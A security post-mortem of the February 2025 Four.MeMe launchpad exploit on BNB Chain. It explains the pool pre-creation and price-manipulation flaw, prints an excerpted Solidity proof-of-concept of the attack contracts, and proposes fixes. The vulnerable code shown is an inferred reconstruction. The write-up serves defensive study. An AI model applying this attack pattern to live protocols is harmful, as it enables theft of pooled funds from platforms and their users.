# Four.MeMe — Business Logic Vulnerability Analysis (Pre-Liquidity Injection Attack)

| Item | Details |
|------|---------|
| **Date** | 2025-02-11 |
| **Protocol** | Four.MeMe (Meme coin launchpad, incubated by Binance Academy) |
| **Chain** | BSC (BNB Chain) |
| **Loss** | ~$183,000 (287 BNB) — ~20 meme tokens affected simultaneously |
| **Attacker 1** | [0x010F...53A](https://bscscan.com/address/0x010Fc97CB0a4D101dCe20DAB37361514bD59A53A) |
| **Attacker 2** | [0x935d...4a5](https://bscscan.com/address/0x935d6cf073eab37ca2b5878af21329d5dbf4f4a5) |
| **Attacker 3** | [0xf918...c79](https://bscscan.com/address/0xf91848a076efaa6b8ecc9d378ab6d32bd506dc79) |
| **Attacker 4** | [0x9070...33d](https://bscscan.com/address/0x907004b6bb6965a83fdbcbc060a5b30bc876c33d) |
| **Attacker 5** | [0x482b...2fda](https://bscscan.com/address/0x482b004e7800174a1efb87f496552ac8f53b2fda) |
| **Attack Contract 1** | [0x0679...D051](https://bscscan.com/address/0x06799F7b09A455c1cF6a8E7615Ece04B31A9D051) (swap / profit extraction) |
| **Attack Contract 2** | [0x4fde...9591](https://bscscan.com/address/0x4fdebca823b7886c3a69fa5fc014104f646d9591) (meme token purchase) |
| **Attack Contract 3** | [0xbf26...686c](https://bscscan.com/address/0xbf26e147918a07cb8d8cf38d260edf346977686c) (malicious pool creation) |
| **Vulnerable Contract** | [0x5c95...762b](https://bscscan.com/address/0x5c952063c7fc8610FFDB798152D69F0B9550762b) (Four.MeMe launchpad) |
| **Preparation Tx 1** | [0xdb5d...d582](https://bscscan.com/tx/0xdb5d43317ab8e5d67cdd5006b30a6f2ced513237ac189eb1e57f0f06f630d582) (meme token purchase) |
| **Preparation Tx 2** | [0x4235...4dff](https://bscscan.com/tx/0x4235b006b94a79219181623a173a8a6aadacabd01d6619146ffd6fbcbb206dff) (malicious pool creation) |
| **Preparation Tx 3** | [0xe0da...eb5](https://bscscan.com/tx/0xe0daa3bf68c1a714f255294bd829ae800a381624417ed4b474b415b9d2efeeb5) (Four.MeMe addLiquidity) |
| **Attack Tx** | [0x2902...27f61](https://bscscan.com/tx/0x2902f93a0e0e32893b6d5c907ee7bb5dabc459093efa6dbc6e6ba49f85c27f61) (swap and profit extraction) |
| **Attack Block** | 46,555,732 (BSC) |
| **Root Cause** | Business logic flaw — transfer restriction bypass inside `buyTokenAMAP` + missing pool validation in `addLiquidity` |
| **PoC Source** | [DeFiHackLabs — FourMeme_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/FourMeme_exp.sol) |

---

## 1. Vulnerability Overview

Four.MeMe is a meme coin launchpad on BSC, a pump.fun-style platform incubated by Binance Academy. Tokens go through a presale via an internal bonding curve before migrating to PancakeSwap V3.

This attack resulted from a combination of two business logic flaws:

**Flaw 1 — `buyTokenAMAP` transfer restriction bypass**
Token transfers during the internal trading period should be restricted, but the `buyTokenAMAP` function did not prevent transfers to a PancakeSwap pair address that had not yet been created. Attackers exploited this to pre-send meme tokens to the pair address before the PancakeSwap pool was created.

**Flaw 2 — Missing pool validation in `addLiquidity`**
Four.MeMe's `addLiquidity` function did not verify whether a pool already existed at migration time, nor whether that pool had been initialized at a legitimate price. If an attacker pre-created a pool with a heavily manipulated `sqrtPriceX96` (approximately 10^40 — 368 quadrillion times the normal price), the platform would inject liquidity into that malicious pool upon migration. The attacker then swapped a tiny amount of meme tokens for a large amount of WBNB by exploiting the manipulated price in the malicious pool.

Approximately 20 meme tokens were compromised in succession using the same pattern.

---

## 2. Vulnerable Code Analysis

### 2.1 `buyTokenAMAP` — Internal Trading Restriction Bypass (Core Vulnerability 1)

```solidity
// ❌ Vulnerable code — Four.MeMe launchpad (source not public, behavior inferred)
function buyTokenAMAP(
    address token,
    uint256 amount,
    uint256 /*unknown*/
) external payable {
    // Purchase tokens and transfer to msg.sender
    uint256 tokenAmount = calculateTokenAmount(token, msg.value);

    // ❌ Core flaw: no recipient validation
    //    Transfers to a PancakeSwap pair address (not yet created) are permitted
    //    No effective transfer restriction during the internal trading period
    IERC20(token).transfer(msg.sender, tokenAmount);

    // ❌ No restriction when msg.sender is a contract (attack contract)
    //    Attack contract can re-transfer received tokens to the pair address
}
```

```solidity
// ✅ Fixed code — strengthened internal trading restrictions
function buyTokenAMAP(
    address token,
    uint256 amount,
    uint256 /*unknown*/
) external payable {
    // ✅ EOA only: block contract callers
    require(msg.sender == tx.origin, "BuyTokenAMAP: contract calls not allowed");

    // ✅ Apply recipient whitelist or blacklist
    require(!isExcludedAddress(msg.sender), "BuyTokenAMAP: recipient not permitted");

    uint256 tokenAmount = calculateTokenAmount(token, msg.value);

    // ✅ Restrict transfer targets while token is still in internal trading
    if (tokenState[token] == TokenState.INTERNAL_TRADING) {
        require(isWhitelistedReceiver(msg.sender), "BuyTokenAMAP: transfer restricted during internal trading");
    }

    IERC20(token).transfer(msg.sender, tokenAmount);
}
```

**Issue**: `buyTokenAMAP` allows contract callers, and the received tokens can be freely re-transferred to a PancakeSwap pair address that does not yet exist. This effectively nullifies the bonding curve restrictions of the internal trading period.

---

### 2.2 `addLiquidity` — Missing Pool Validation (Core Vulnerability 2)

```solidity
// ❌ Vulnerable code — Four.MeMe addLiquidity (source not public, behavior inferred)
function addLiquidity(
    address token,
    uint160 sqrtPriceX96
) external {
    // Restricted to onlyOwner or governance calls

    // ❌ Core flaw: no check for existing pool or price validity
    //    Cannot detect if an attacker has already created a pool with a manipulated price
    address pool = IPancakeRouter(pancakeRouter).createAndInitializePoolIfNecessary(
        token,
        wbnb,
        fee,
        sqrtPriceX96    // ❌ Uses externally supplied price as-is
    );

    // ❌ Does not verify whether the pool's current sqrtPriceX96 is within expected range
    //    Liquidity is injected into the malicious pool (with manipulated price)
    _addLiquidityToPool(pool, token, wbnb, liquidity);
}
```

```solidity
// ✅ Fixed code — pool validation added
function addLiquidity(
    address token,
    uint160 sqrtPriceX96
) external {
    // ✅ Price range validation: verify within ±5% of expected price
    uint160 expectedPrice = calculateExpectedSqrtPrice(token, wbnb);
    require(
        sqrtPriceX96 >= expectedPrice * 95 / 100 &&
        sqrtPriceX96 <= expectedPrice * 105 / 100,
        "AddLiquidity: price out of range"
    );

    // ✅ If a pool already exists, validate its current price
    address existingPool = IPancakeFactory(pancakeFactory).getPool(token, wbnb, fee);
    if (existingPool != address(0)) {
        // Verify the existing pool's current price is within the expected range
        (uint160 currentSqrtPrice,,,,,,) = IPancakePool(existingPool).slot0();
        require(
            currentSqrtPrice >= expectedPrice * 95 / 100 &&
            currentSqrtPrice <= expectedPrice * 105 / 100,
            "AddLiquidity: existing pool price anomaly"
        );
    }

    address pool = IPancakeRouter(pancakeRouter).createAndInitializePoolIfNecessary(
        token,
        wbnb,
        fee,
        sqrtPriceX96
    );

    _addLiquidityToPool(pool, token, wbnb, liquidity);
}
```

**Issue**: `addLiquidity` does not validate the pool's current `sqrtPriceX96`, so if an attacker pre-creates a pool with an extremely manipulated price, the platform injects liquidity directly into that pool.

---

## 3. Attack Flow

### 3.1 Preparation Phase

During Four.MeMe's internal trading period, the attacker purchased a meme token (snowboard, `0x4AbfD...`) with a very small amount (0.0001 BNB) and held it in the attack contract (`BuyMemeFromFourMeme`).

### 3.2 Execution Phase (4-Step Attack)

```
┌──────────────────────────────────────────────────────────────────┐
│  Attacker (EOA × 5)                                              │
│  Initial funds: 0.0001 BNB (minimal)                            │
└──────────────────┬───────────────────────────────────────────────┘
                   │ Step 1: call buyToken()
                   ▼
┌──────────────────────────────────────────────────────────────────┐
│  BuyMemeFromFourMeme contract                                     │
│  ── calls IFourMeme.buyTokenAMAP(memeToken, 1e14, 0)            │
│  ── Four.MeMe delivers meme tokens to contract without restriction│
│  Result: 1,603 meme tokens acquired (block 46,555,711)           │
└──────────────────┬───────────────────────────────────────────────┘
                   │ Step 2: call createPool()
                   ▼
┌──────────────────────────────────────────────────────────────────┐
│  HackerPool contract                                              │
│  ── queries fee tier from Four.MeMe launchpad (selector 0x9f266331)│
│  ── sets sqrtPriceX96 = 10^40 (368 quadrillion × normal price)  │
│  ── calls PancakeRouter.createAndInitializePoolIfNecessary()     │
│  Result: malicious pool created (block 46,555,725)               │
│         Pool: 0xa610cC0d657bbFe78c9D1eA638147984B2F3C05c        │
└──────────────────┬───────────────────────────────────────────────┘
                   │ Step 3: trigger addLiquidity (legitimate migration)
                   ▼
┌──────────────────────────────────────────────────────────────────┐
│  Four.MeMe launchpad (vulnerable contract)                        │
│  ── fourMemeOwner calls IFourMeme.addLiquidity(memeToken, price) │
│  ❌ Injects liquidity into the existing malicious pool            │
│     without any pool validation                                   │
│  ── Large amount of WBNB deposited into the manipulated price pool│
│  Result: large WBNB liquidity trapped in malicious pool           │
│          (block 46,555,731)                                       │
└──────────────────┬───────────────────────────────────────────────┘
                   │ Step 4: swap() → extract profit
                   ▼
┌──────────────────────────────────────────────────────────────────┐
│  Swap contract                                                    │
│  ── swaps 1,603 meme tokens → 23.426 WBNB via malicious pool    │
│  ── pancakeV3SwapCallback: delivers meme tokens to receive WBNB  │
│  ── WETH.withdraw(): converts WBNB → BNB                        │
│  ── transfers to attacker EOA                                    │
│  Result: block 46,555,732 — 23.426 BNB profit (single token)    │
└──────────────────────────────────────────────────────────────────┘
                   │ ✕ Repeated: same pattern applied to ~20 meme tokens
                   ▼
┌──────────────────────────────────────────────────────────────────┐
│  Total loss: ~287 BNB ($183,000)                                 │
│  Four.MeMe emergency response: halted new token launches          │
│  and liquidity migrations                                         │
└──────────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

- **Attacker profit**: ~287 BNB (~$183,000)
- **Protocol loss**: Full WBNB drained from liquidity pools of ~20 meme tokens
- **Platform response**: Immediately halted new token launches and PancakeSwap liquidity migration functionality

---

## 4. PoC Code (Excerpted from DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// @KeyInfo - Total Loss: 186k (287 BNB)
// Attacker 1: 0x010Fc97CB0a4D101dCe20DAB37361514bD59A53A
// Vulnerable Contract (Four.MeMe launchpad): 0x5c952063c7fc8610FFDB798152D69F0B9550762b
// Malicious Pool: 0xa610cC0d657bbFe78c9D1eA638147984B2F3C05c

// ─── Interface Definitions ────────────────────────────────────────
interface IFourMeme {
    // Liquidity migration function (vulnerability: missing pool validation)
    function addLiquidity(address token, uint160 sqrtPriceX96) external;
    // Meme token purchase during internal trading period (vulnerability: contract calls allowed)
    function buyTokenAMAP(address token, uint256 amount, uint256 unknown) external payable;
}

contract FourMeme is BaseTestWithBalanceLog {
    address public fourMeme = 0x5c952063c7fc8610FFDB798152D69F0B9550762b; // vulnerable contract
    address public memeToken = 0x4AbfD9a204344bd81A276C075ef89412C9FD2f64; // snowboard token
    address public pancakeRouter = 0x46A15B0b27311cedF172AB29E4f4766fbE7F4364;

    function testExploit() public balanceLog {
        // [Step 1] Pre-purchase meme tokens
        buyMemeToken();
        // [Step 2] Create malicious pool with manipulated price
        HackerCreatePool();
        // [Step 3] Simulate legitimate Four.MeMe liquidity injection (victim role)
        CreatePool();
        // [Step 4] Extract profit via swap
        SwapToken();
    }
}

// ─── Attack Contract 1: Pre-purchase meme tokens ─────────────────
contract BuyMemeFromFourMeme {
    function buyToken() public payable {
        // Purchase meme tokens with 0.0001 BNB during internal trading period
        // Succeeds because buyTokenAMAP does not block contract callers
        IFourMeme(fourMeme).buyTokenAMAP{value: msg.value}(memeToken, 100_000_000_000_000, 0);
    }
}

// ─── Attack Contract 2: Create malicious pool ────────────────────
contract HackerPool {
    function createPool() public returns (address) {
        // Query fee tier from Four.MeMe (hidden function selector: 0x9f266331)
        (bool success, bytes memory data) = address(fourMeme).call(
            abi.encodeWithSelector(0x9f266331, address(memeToken))
        );
        (, uint24 pancakeFee, ) = abi.decode(data, (uint256, uint24, uint256));

        // ❌ sqrtPriceX96 = 10^40 — hundreds of trillions of times the normal price
        //    Equivalent to 1 meme token = hundreds of thousands of WBNB
        uint160 sqrtPriceX96 = uint160(10_000_000_000_000_000_000_000_000_000_000_000_000_000);

        // Create PancakeSwap V3 pool first with manipulated price
        address pool = IPancakeRouter(pancakeRouter).createAndInitializePoolIfNecessary(
            memeToken, wbnb, pancakeFee, sqrtPriceX96
        );
        return pool; // return malicious pool address
    }
}

// ─── Attack Contract 3: Extract profit via swap ──────────────────
contract Swap {
    function swap(int256 amountSpecified, uint160 sqrtPriceLimitX96) public returns (int256) {
        // Execute meme token → WBNB swap on malicious pool
        // sqrtPriceLimitX96 = 4,295,128,740 (very low price limit = maximum WBNB extraction)
        (int256 memeTokenAmount, int256 wbnbAmount) = IPancakePool(pancakePool).swap(
            address(this),
            true,           // zeroForOne: meme token (token0) → WBNB (token1) direction
            amountSpecified, // full meme token amount
            sqrtPriceLimitX96,
            ""
        );
        return wbnbAmount; // return amount of WBNB obtained
    }

    // PancakeSwap V3 callback: responds when pool requests meme tokens
    function pancakeV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        // Deliver meme tokens to pool upon swap completion (callback pattern)
        IERC20(memeToken).transfer(pancakePool, uint256(amount0Delta));
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|---------------|----------|-----|
| V-01 | Missing pool price validation at migration | CRITICAL | CWE-20 (Improper Input Validation) |
| V-02 | Contract callers allowed during internal trading period | HIGH | CWE-284 (Improper Access Control) |
| V-03 | No check for pre-existing pool | HIGH | CWE-362 (Race Condition / Unexpected State) |
| V-04 | Missing pre-migration state validation for DEX migration | MEDIUM | CWE-754 (Improper Check for Unusual or Exceptional Conditions) |

---

### V-01: Missing Pool Price Validation at Migration (CRITICAL)

- **Description**: The `addLiquidity` function injects liquidity without validating the `sqrtPriceX96` (current price) of an already-existing PancakeSwap V3 pool. Attackers exploit this by pre-creating a pool with an extremely manipulated price.
- **Impact**: All liquidity (WBNB) injected by the platform is locked in the malicious pool, and the attacker can drain all WBNB with a negligible amount of meme tokens.
- **Attack Conditions**: Must be able to create a pool with the same token pair/fee tier before migration. Must be able to hold a small amount of meme tokens during the internal trading period.

---

### V-02: Contract Callers Allowed During Internal Trading Period (HIGH)

- **Description**: The `buyTokenAMAP` function does not enforce a `msg.sender == tx.origin` check, allowing attack contracts to purchase and hold tokens directly.
- **Impact**: Internal trading restrictions (bonding curve, transfer limits) are bypassed. Attack contracts can acquire meme tokens to use in the subsequent swap attack.
- **Attack Conditions**: Must be able to deploy a contract capable of sending BNB during the internal trading period.

---

### V-03: No Check for Pre-Existing Pool (HIGH)

- **Description**: `addLiquidity` uses `createAndInitializePoolIfNecessary`, but when a pool already exists, it ignores the existing pool's state (price, liquidity) and injects liquidity regardless.
- **Impact**: A pre-created malicious pool is treated as the "official pool" and absorbs the platform's liquidity.
- **Attack Conditions**: Token launch timing must be predictable, or the migration transaction must be detectable in advance via on-chain event monitoring.

---

### V-04: Missing Pre-Migration State Validation for DEX Migration (MEDIUM)

- **Description**: There is no mechanism to comprehensively validate the full internal trading state (balances, pool existence, unauthorized pre-transfers, etc.) before migration.
- **Impact**: The platform cannot detect multi-step preparation by an attacker spread across multiple blocks.
- **Attack Conditions**: An environment where attack steps can be distributed across multiple blocks.

---

## 6. Remediation Recommendations

### Immediate Actions

**Fix 1: `buyTokenAMAP` — Restrict to EOA Only**

```solidity
// ✅ Block contract callers to strengthen internal trading restrictions
function buyTokenAMAP(address token, uint256 amount, uint256 unknown) external payable {
    // EOA only — prevent bypass via contract callers
    require(msg.sender == tx.origin, "buyTokenAMAP: contract calls not allowed");
    // ... existing logic
}
```

**Fix 2: `addLiquidity` — Pool Price Range Validation**

```solidity
// ✅ Validate existing pool state before migration
function addLiquidity(address token, uint160 expectedSqrtPriceX96) external onlyOwner {
    address existingPool = IPancakeFactory(pancakeFactory).getPool(token, wbnb, fee);

    if (existingPool != address(0)) {
        // Verify the existing pool's current price is within expected range (±2%)
        (uint160 currentSqrtPriceX96,,,,,,) = IPancakePool(existingPool).slot0();
        uint160 lowerBound = expectedSqrtPriceX96 * 98 / 100;
        uint160 upperBound = expectedSqrtPriceX96 * 102 / 100;
        require(
            currentSqrtPriceX96 >= lowerBound && currentSqrtPriceX96 <= upperBound,
            "addLiquidity: existing pool price out of range — possible malicious pool"
        );
    }

    // Inject liquidity after validation passes
    address pool = IPancakeRouter(pancakeRouter).createAndInitializePoolIfNecessary(
        token, wbnb, fee, expectedSqrtPriceX96
    );
    _addLiquidityToPool(pool, token, wbnb, liquidity);
}
```

---

### Structural Improvements

| Vulnerability | Recommended Mitigation |
|---------------|------------------------|
| V-01 Missing pool price validation | Query `slot0()` before migration to validate `sqrtPriceX96` range; leverage TWAP oracle |
| V-02 Contract callers allowed | Enforce `msg.sender == tx.origin`; or maintain a whitelist of permitted addresses |
| V-03 No check for pre-existing pool | Check for existing pool via `PancakeFactory.getPool()` before migration and handle accordingly |
| V-04 Missing pre-migration validation | Introduce a migration checklist function (batch validation of balances, pool state, unauthorized LPs, etc.) |
| Monitoring | Add on-chain monitoring for abnormal token transfer patterns during the internal trading period |
| Emergency pause | Implement a Circuit Breaker — automatically halt migration upon detection of abnormal trading volume or pool state |

---

## 7. Lessons Learned

1. **DEX migrations must validate untrusted external state**: When a launchpad transfers liquidity to a DEX, it must always account for the possibility that the DEX pool was pre-created and manipulated by an attacker. The naive logic of "create a pool if one doesn't exist" is vulnerable to pre-creation attacks.

2. **Internal trading restrictions must be enforced at the contract level**: Without a `tx.origin == msg.sender` check or a permitted address whitelist, internal trading restrictions can be trivially bypassed by attack contracts. Validating recipient eligibility on token transfer is equally important.

3. **PancakeSwap V3's `createAndInitializePoolIfNecessary` is not a safety mechanism**: This function is a convenience feature that creates a pool only if one does not already exist. It does not validate the price of an existing pool. Launchpad developers must fully understand this function's behavior and implement additional validation logic themselves.

4. **The same vulnerability can be applied repeatedly across multiple tokens**: A platform-level vulnerability affects every token launched on that platform. This attack exploited the same pattern to compromise approximately 20 meme tokens in succession.

5. **Beware of attacks that start with minimal capital**: The attacker started with 0.0001 BNB (~$0.06) and extracted $183,000. Attacks with very low entry costs carry a high risk of being repeated across multiple targets.

6. **Presale/launchpad platforms should benchmark pump.fun's security design**: Solana's pump.fun gives the platform atomic control over the entire flow from token creation to DEX migration. If BSC launchpads cannot implement equivalent atomicity within EVM constraints, they must at minimum perform thorough validity checks at the migration step.

---

## 8. On-Chain Verification

The on-chain attack transactions can be verified directly on BSCScan:

- **Preparation Tx (meme token purchase)**: [0xdb5d...d582](https://bscscan.com/tx/0xdb5d43317ab8e5d67cdd5006b30a6f2ced513237ac189eb1e57f0f06f630d582) — block 46,555,711
- **Preparation Tx (malicious pool creation)**: [0x4235...4dff](https://bscscan.com/tx/0x4235b006b94a79219181623a173a8a6aadacabd01d6619146ffd6fbcbb206dff) — block 46,555,725
- **Preparation Tx (platform addLiquidity)**: [0xe0da...eb5](https://bscscan.com/tx/0xe0daa3bf68c1a714f255294bd829ae800a381624417ed4b474b415b9d2efeeb5) — block 46,555,731
- **Attack Tx (swap / profit extraction)**: [0x2902...27f61](https://bscscan.com/tx/0x2902f93a0e0e32893b6d5c907ee7bb5dabc459093efa6dbc6e6ba49f85c27f61) — block 46,555,732

### 8.1 PoC vs. On-Chain Amount Comparison (single attack, snowboard token)

| Item | PoC Value | On-Chain Actual | Notes |
|------|-----------|-----------------|-------|
| Initial investment | 0.0001 BNB | 0.0001 BNB | Match |
| Meme tokens purchased | ~1,603 | ~1,603 | Match (estimated) |
| Malicious pool sqrtPriceX96 | 10^40 | 10^40 | Match |
| WBNB obtained (single token) | ~23.426 WBNB | 23.426 WBNB | Match |
| Total loss (20 tokens) | — | ~287 BNB | Aggregated across multiple victims |

### 8.2 Attack Block Sequence

| Block | Action | Actor |
|-------|--------|-------|
| 46,555,711 | `buyTokenAMAP` — pre-purchase meme tokens | Attacker |
| 46,555,725 | `createAndInitializePoolIfNecessary` — create malicious pool (10^40 price) | Attacker |
| 46,555,731 | `addLiquidity` — platform injects WBNB into malicious pool | Four.MeMe operator |
| 46,555,732 | `swap` — meme token → WBNB swap, profit extraction | Attacker |

### 8.3 Precondition Verification

- Prior to the attack block, no PancakeSwap V3 pool existed for the meme token/WBNB/fee tier combination (attacker was the first to create it).
- Four.MeMe launchpad did not check for an existing pool when calling `addLiquidity`.
- It was confirmed that a contract (`BuyMemeFromFourMeme`) could successfully call `buyTokenAMAP` during the internal trading period.

---

*References: [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/FourMeme_exp.sol) · [PeckShield Alert](https://x.com/PeckShieldAlert/status/1889210001220423765) · [Securrtech Analysis](https://securrtech.medium.com/the-four-meme-exploit-a-deep-dive-into-the-183-000-hack-6f45369029be) · [ChainCatcher Analysis](https://www.chaincatcher.com/en/article/2167296)*